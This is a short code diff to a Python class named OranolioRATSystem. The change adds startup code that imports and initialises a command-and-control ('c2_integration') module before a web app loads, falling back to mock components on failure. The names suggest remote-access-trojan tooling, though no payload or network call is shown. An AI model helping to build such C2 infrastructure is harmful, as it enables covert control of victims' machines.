@@ -180,6 +180,11 @@ class OranolioRATSystem:
         
         try:
             from web_app import app, socketio
+            from c2_integration import initialize_c2_system
+            
+            # Initialize C2 system first
+            if not initialize_c2_system():
+                logger.warning("C2 system initialization failed, continuing with mock components")
             
             # Integrate enhancements
             from web_app_enhancements import integrate_enhancements
